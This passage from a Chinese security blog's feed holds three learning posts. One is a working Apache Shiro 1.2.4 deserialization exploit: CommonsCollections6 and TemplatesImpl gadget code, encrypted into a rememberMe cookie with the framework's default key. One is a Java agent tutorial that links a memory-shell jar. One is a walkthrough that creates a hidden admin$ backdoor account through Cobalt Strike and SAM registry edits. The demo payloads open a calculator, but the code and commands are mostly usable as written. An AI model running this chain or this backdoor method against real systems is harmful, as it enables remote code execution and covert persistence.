~[shiro-core-1.2.4.jar:1.2.4]    ... 46 common frames omitted</code></pre><h2 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h2><p>这里用的是cc6的原因也是因为看了p牛的文章，想自己脱离文章试一下。</p><p>先改写一下cc6生成payload,cc6.java改的很简单只是使原来的方法改写成返回字节数组的函数，然后再编写一个test.java将返回的字节码利用shiro 1.2.4内置的密钥进行加密，生成命令执行的rememberMe。</p><h3 id="cc6-java"><a href="#cc6-java" class="headerlink" title="cc6.java"></a>cc6.java</h3><pre><code class="java">import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 &#123;    public byte[] getPayload(String command) throws Exception &#123;        Transformer Testtransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers=new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe &quot;&#125;)        &#125;;        Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(Testtransformer, transformers);//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));//        objectOutputStream.writeObject(hashSet);//        objectOutputStream.close();////        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));//        objectInputStream.readObject();        ByteArrayOutputStream stream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(stream);        objectOutputStream.writeObject(hashSet);        objectOutputStream.close();        return stream.toByteArray();    &#125;&#125;</code></pre><h3 id="test-java"><a href="#test-java" class="headerlink" title="test.java"></a>test.java</h3><pre><code class="java">import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;public class test &#123;    public static void main(String[] args) throws Exception &#123;        byte[] payload = new cc6().getPayload(&quot;calc.exe&quot;);        AesCipherService aes = new AesCipherService();        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payload, key);        System.out.printf(ciphertext.toString());    &#125;&#125;</code></pre><p>将生成的rememberMe去访问login.jsp的页面，如图：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp5mdurzj30od0k5wj5.jpg" alt=""></p><p>但是并没有弹出计算器，查看idea的报错：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7qh1s8j318v09874s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7vcb17j318s034weg.jpg" alt=""></p><p>我们查看一下报错的内容，好像是和类没有加载成功有关[Lorg.apache.commons.collections.Transformer;，而这个类就是我们cc6里面用到的Transformer，但是为什么会报错呢，还有这个最前面多余的[L是什么意思？</p><p>我们先来回答第二个问题，这个符号表示的是这是一个数组，即Transformer[]。那么为什么这个类无法加载呢？我们debug进去看一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpoiwtn6j312s073q3v.jpg" alt=""></p><p>可以看见这里重写了resolve方法，我们先比较一下与原来有什么不同</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpvb0lvlj31bh0n4gmm.jpg" alt=""></p><p>在ClassResolvingObjectInputStream.resolveClass中，不同之处就在与父类使用的是Class.forname()而在后者使用的则是org.apache.shiro.util.ClassUtils.forname(),为了知道有什么具体的不同我们跟进进行观察。</p><p>进入ClassUtils.forname()后我们可以发现其实内部调用的是Class.loadClass()这个方法。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpz8uczjj30uh0djmyy.jpg" alt=""></p><p>在一般情况下Class.forname和Class.loadClass()的效果是相同的，但是loadClass的方法不能加载数组，继续往loadClass里面跟进会调用Class.forName,再继续追就是双亲委派了。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqjp3xhbj30uh0djmyy.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqju3vz0j30jo06emxq.jpg" alt=""></p><p>在整体流程里面，WebappsClassLoader会先寻找内部缓存，寻找类，找不到交给URLClasssLoader但是寻找的却是/[Lorg而不是/org打头所以没有找到。</p><p>那么现在找到了原因，cc6中不能使用数组，可是不能使用Transformer的数组岂不是凉了吗，可是p牛还是相处了解决方案。而这个解决方案为之前的fastjson的文章也利用到过，就是使用TemplatesImpl来执行命令。</p><h2 id="修改cc6利用链"><a href="#修改cc6利用链" class="headerlink" title="修改cc6利用链"></a>修改cc6利用链</h2><p>接下来我们先写一个TemplatesImpl：</p><blockquote><p>TemplatesImpl templates = new TemplatesImpl();<br>            setvalue(templates, “_bytecodes”, new byte[][]{clazzBytes});<br>            setvalue(templates, “_name”, “HelloTemplatesImpl”);<br>            setvalue(templates, “_tfactory”, new TransformerFactoryImpl());</p></blockquote><p>这个我们之前<a href="https://www.yuque.com/pyshare-xiaotan/gc6e3o/tbmrhp#dlHvI">fastjson</a>的时候有写到过。</p><pre><code class="java">public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            templates.newTransformer();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgkukjfatj31c10u016f.jpg" alt=""></p><p>确实可以触发命令执行，那我们在转回去结合cc6看看，如何结合起来。</p><blockquote><p>Transformer[] transformer = new Transformer[]{<br>                new ConstantTransformer(templates),<br>                    new InvokerTransformer(“newTransformer”, null,null)<br>            };</p></blockquote><p>这里的ConstantTransformer会返回对象，然后调用nerTransformer方法，实际上就是原来的templates.newTransformer()。但是这里还是用到了数组，我们现在要想办法代替掉这个步骤。</p><p>我们再转回去看看cc6的代码，其中有这段：</p><pre><code> Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);</code></pre><p>在LazyMap#get的方法中存在this.factory.transform(key)的方法，那我们只要控制这里的key为我们设置的templatesImpl，控制this.factory为invokeTransfomer就可以执行命令了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgm6o80ioj30vu0tsamt.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmupoi3sj311406wwfu.jpg" alt=""></p><p>下面接下来的就和cc6一样了，我们控制TideMapEntry中的map为LazyMap就可以了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmwr006oj311e0sm7ac.jpg" alt=""></p><p>现在利用链已经构造好了，完整代码如下：</p><pre><code>public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            InvokerTransformer transformer = new InvokerTransformer(&quot;getClass&quot;,null, null);            Map map=new HashMap();            Map lazyMap= LazyMap.decorate(map,transformer);            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);            HashSet hashSet=new HashSet(1);            hashSet.add(tiedMapEntry);            lazyMap.clear();            setvalue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));            objectOutputStream.writeObject(hashSet);            objectOutputStream.close();            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));            objectInputStream.readObject();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgoobc3g6j31kx0u0hdt.jpg" alt=""><br>下面是debug执行命令的具体地方<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgp36981qj310v0u0dwj.jpg" alt=""><br>但是这里可以注意到cc6原来使用的是remove那为什么我们这里使用的却是clear呢？<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgomjwdaxj31ce0pogsf.jpg" alt=""></p><p>其实是可以的只是我学太久了，脑子不太灵光了，哈哈。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtukcu7cj30l80a6gpw.jpg" alt=""><br>这样写是可以弹出来的，原来的remove健写错了导致命令执行出现了错误。感兴趣可以自己debug看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtvprfz1j31hw0a6dpc.jpg" alt=""></p><p>最后再自己修改一下代码，这里我就不贴了。最后我的环境搭在windows上我mac是m1有点小问题，不过也成功弹出计算器了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grguew3s6lj313j0ljte8.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次脱离文章自己写东西，以前都是一边看一边写的，感觉收获还是蛮大的，临近期末，事情也越来越多，争取每天都能学到新的东西。</p>]]></content>
    
    <summary type="html">
    
      Shiro反序列化漏洞学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Java agent学习</title>
    <link href="http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-09T06:31:01.000Z</published>
    <updated>2021-11-17T01:35:33.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-agent学习"><a href="#Java-agent学习" class="headerlink" title="Java agent学习"></a>Java agent学习</h1><h2 id="JVMTI-（JVM-Tool-Interface）"><a href="#JVMTI-（JVM-Tool-Interface）" class="headerlink" title="JVMTI （JVM Tool Interface）"></a>JVMTI （JVM Tool Interface）</h2><p>JVMTI （JVM Tool Interface）是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载，而在目标JVM运行时进行Agent加载具备动态性。</p><h2 id="JVM启动前"><a href="#JVM启动前" class="headerlink" title="JVM启动前"></a>JVM启动前</h2><h3 id="javaagent参数"><a href="#javaagent参数" class="headerlink" title="javaagent参数"></a>javaagent参数</h3><p>javaagent是java命令的一个参数。改参数可指定一个jar包，一条java命令中可多次出现javaagent，对于jar包有下面两个要求：</p><ol><li>这个jar包的MANIFEST.MF文件必须指定Premain-Class项。</li><li>Premain-Class指定的类必须有premain()方法。</li></ol><blockquote><p>premain方法是中JVM启动时先于main函数运行的，JVM启动时会先运行-javaagent指定类的premain方法。</p></blockquote><p>同时javaagent命令要求指定的类必须有premain()，并且对其方法对签名也有要求：</p><pre><code class="java">public static void premain(String agentArgs, Instrumentation inst); public static void premain(String agentArgs);</code></pre><p>JVM会优先价值带Instrumentation签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种方法。</p><p>Instrumentation类定义如下：</p><pre><code class="java">public interface Instrumentation &#123;    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);    //删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);    boolean isRetransformClassesSupported();    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;    boolean isRedefineClassesSupported();    void redefineClasses(ClassDefinition... definitions)        throws  ClassNotFoundException, UnmodifiableClassException;    boolean isModifiableClass(Class&lt;?&gt; theClass);    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getInitiatedClasses(ClassLoader loader);    //获取一个对象的大小    long getObjectSize(Object objectToSize);    void appendToBootstrapClassLoaderSearch(JarFile jarfile);    void appendToSystemClassLoaderSearch(JarFile jarfile);    boolean isNativeMethodPrefixSupported();    void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix);&#125;</code></pre><p>使用 javaagent 需要几个步骤：</p><ul><li><p>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</p></li><li><p>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</p></li><li><p>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</p></li><li><p>使用参数 -javaagent: jar包路径 启动要代理的方法。</p><p> 在执行以上步骤后，JVM 会先执行 premain 方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。当然，遗漏的主要是系统类，因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，这个方法是在 main 方法启动前拦截大部分类的加载活动，既然可以拦截类的加载，那么就可以去做重写类这样的操作，结合第三方的字节码编译工具，比如ASM，javassist，cglib等等来改写实现类。</p></li></ul><p>下面我们用IDEA来试验一下，我们先创建一个agent_test的项目<br>在src下创建一个lib文件夹放入javassist.jar包。然后再创建一个org.com在文件夹下创建Agent.java,DefineTransformer.java。<br>Agent.java</p><pre><code class="java">package org.com;import java.lang.instrument.Instrumentation;public class Agent &#123;    public static void premain(String agentArgs, Instrumentation inst) &#123;        inst.addTransformer(new DefineTransformer(), true);    &#125;&#125;</code></pre><p>DefineTransformer.java</p><pre><code class="java">public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>src下/META-INF /MANIFEST.MF</p><pre><code>Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: org.com.Agent</code></pre><ul><li>注意！！！第五行要留空<br>然后生成agent_test.jar随后再创建一个Main.java</li></ul><p>Main.java</p><pre><code class="java">package org.com;public class Main &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;thisismain&quot;);        test(&quot;a&quot;,&quot;bcd&quot;);    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里要记得添加参数</p><blockquote><p>-javaagent:out/artifacts/agent_test_jar/agent_test.jar</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyuws73tj30ue0l6q3x.jpg" alt=""><br>然后运行Main文件可以看见<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqbyogvj1sj30dl05p3yj.jpg" alt=""></p><p>成功修改了字节码。<br>在DefineTransformer中，里面出现了$1,$2.这指的是函数的第一个和第二个参数，这之前的文章有说到过。</p><h2 id="JVM启动后"><a href="#JVM启动后" class="headerlink" title="JVM启动后"></a>JVM启动后</h2><p>上面介绍的Instrumentation是这JDK1.5中提供的，开发者只能在main加载之前添加手脚，在Java SE 6中，提供了新的代理agentmain</p><p>跟premain方法一样<br>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p><ul><li>public static void agentmain(String agentArgs, Instrumentation inst);</li><li>public static void agentmain(String agentArgs);</li></ul><p>这两组方法的第一个参数AgentArgs是随同 “– javaagent”一起传入的程序参数，如果这个字符串代表了多个参数，就需要自己解析这些参数。inst是Instrumentation类型的对象，是JVM自动传入的，我们可以拿这个参数进行类增强等操作。</p><p>指定Main-Class</p><p>Agent-Class: class</p><p>Agent.java</p><pre><code class="java">package org.com;import javassist.*;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;//public class DefineTransformer implements ClassFileTransformer &#123;//    @Override//    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;//        System.out.println(&quot;premain load Class:&quot; + className);//        return new byte[0];//    &#125;//&#125;public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>Main.java</p><pre><code class="java">package org.com;import com.sun.tools.attach.*;import java.io.IOException;import java.util.List;public class Main &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        System.out.println(&quot;running JVM start &quot;);        test(&quot;a&quot;,&quot;bcd&quot;);        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd: list)&#123;            System.out.println(vmd.displayName());            if(vmd.displayName().equals(&quot;org.com.Main&quot;))&#123;                VirtualMachine attach = VirtualMachine.attach(vmd.id());                attach.loadAgent(&quot;F:\\IDEAcode\\agent_test\\out\\artifacts\\agent_test_jar\\agent_test.jar&quot;);                attach.detach();            &#125;        &#125;    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里偷懒了，用了别人写的代码<br>当然MANIFEST.MF文件也是要修改的，这里就不再说怎么改了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqc07utyuvj31f6099jsn.jpg" alt=""></p><h3 id="premain与agentmain的区别："><a href="#premain与agentmain的区别：" class="headerlink" title="premain与agentmain的区别："></a>premain与agentmain的区别：</h3><p>premain和agentmain两种方式最终的目的都是为了回调Instrumentation实例并激活sun.instrument.InstrumentationImpl#transform()（InstrumentationImpl是Instrumentation的实现类）从而回调注册到Instrumentation中的ClassFileTransformer实现字节码修改，本质功能上没有很大区别。两者的非本质功能的区别如下：</p><ul><li><p>premain方式是JDK1.5引入的，agentmain方式是JDK1.6引入的，JDK1.6之后可以自行选择使用premain或者agentmain。</p></li><li><p>premain需要通过命令行使用外部代理jar包，即-javaagent:代理jar包路径；agentmain则可以通过attach机制直接附着到目标VM中加载代理，也就是使用agentmain方式下，操作attach的程序和被代理的程序可以是完全不同的两个程序。</p></li><li><p>premain方式回调到ClassFileTransformer中的类是虚拟机加载的所有类，这个是由于代理加载的顺序比较靠前决定的，在开发者逻辑看来就是：所有类首次加载并且进入程序main()方法之前，premain方法会被激活，然后所有被加载的类都会执行ClassFileTransformer列表中的回调。</p></li><li><p>agentmain方式由于是采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class&lt;?&gt;… classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调。</p></li><li><p>通过premain方式的代理Jar包进行了更新的话，需要重启服务器，而agentmain方式的Jar包如果进行了更新的话，需要重新attach，但是agentmain重新attach还会导致重复的字节码插入问题，不过也有Hotswap和DCE VM方式来避免。</p></li></ul><h2 id="基于agent的内存马"><a href="#基于agent的内存马" class="headerlink" title="基于agent的内存马"></a>基于agent的内存马</h2><p>我自己试了试，没有成功。所以打算中后面的文章里面结合序列化在试试看。但是我中github上找到了其他师傅打包好的jar包：<a href="https://github.com/ydnzol/memshell">https://github.com/ydnzol/memshell</a></p><p>不过这个jar包没有使用ShutdownHook来复活内存马。这里我是在docker上进行试验的，不得不吐槽一下m1真的有点坑呀，后来无奈下只能去Windows10上搭docker的环境了QAQ。</p><p>但是因为很久没用docker了，Windows以前的docker好像没用了，我去官网上查，发现之前的版本已经作废，搞到半夜才弄好，我果然是废物QAQ。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqc5o74n5mj30lc090jrl.jpg" alt=""></p><p>具体agent内存马下篇文章再写吧。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透--远程桌面</title>
    <link href="http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <id>http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</id>
    <published>2021-04-29T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:56.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–远程桌面"><a href="#内网渗透–远程桌面" class="headerlink" title="内网渗透–远程桌面"></a>内网渗透–远程桌面</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学代码审计有些枯燥，加上俺内网啥也不会，学学内网换换口味。</p><h1 id="隐藏用户的创建"><a href="#隐藏用户的创建" class="headerlink" title="隐藏用户的创建"></a>隐藏用户的创建</h1><p>因为在Windows环境下创建用户后面如果带入一个“$”符号，在net user时默认是不显示的。</p><p>利用条件：获得管理员权限</p><p>首先在cs中输入以下命令</p><blockquote><p>shell net user admin$ 123456 /add</p></blockquote><blockquote><p>shell net localgroup administrators admin$ /add</p></blockquote><p>第一句是创建一个admin$用户密码为123456.第二句是将用户加入管理组。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0ls1cy2lj30hi065dfx.jpg" alt=""></p><p>我们来验证一下，使用net user命令并无admin用户<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0lst1s90j30i308i74c.jpg" alt=""></p><p>然后远程打开3389端口。</p><blockquote><p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p></blockquote><p>现在已经可以远程连接了，但是中用户组中依然可以看见admin$<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qc4qewkj30m30giaan.jpg" alt=""></p><p>现在我们想办法把这里的admin$也隐藏掉</p><p>利用 运行 输入regedit 打开注册表 ，找到如下图的SAM</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qjibq6xj30sc0i53zp.jpg" alt=""><br>选择SAM 项 ，在工具栏上的“编辑 &gt; 权限” 中设置权限 ，将 Administrators组 的权限设置为完全控制 后保存</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qkwb6svj30bu0ge0t4.jpg" alt=""></p><p>注意！！！这里的拒绝修改是不可逆的</p><p>设置好后重开页面会出现新的子项</p><blockquote><p>SAM &gt; Domains &gt; Account &gt; Users 和 Names</p></blockquote><p>分别找到Administrator用户和admin$用户的两个项<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qx3bgeyj30pm0godlu.jpg" alt=""></p><p>将administrator的F表复制下来，替换admin$的表后导出<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qy6yiodj30lr0fwmxu.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qyechzwj304306t3yf.jpg" alt=""></p><p>再将admin$用户删除</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qymnmpij30cm06bmx7.jpg" alt=""></p><blockquote><p>net user admin$ /del</p></blockquote><p>再将注册表导入</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzn13b9j30dv03qt8v.jpg" alt=""></p><p>现在用户组中已经看不见我们的影子用户</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzsrqxnj30p00c8t9f.jpg" alt=""></p><p>但是现在3389不能连接</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0hkgesj30db0gkdgd.jpg" alt=""><br>点击右下角选择用户添加admin$</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0sl2qxj30c70bcjrl.jpg" alt=""></p><p>现在就可以登录了。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内存马初探</title>
    <link href="http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/"/>
    <id>http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/</id>
    <published>2021-04-18T10:05:01.000Z</published>
    <updated>2021-07-29T05:46:45.064Z</updated>
    
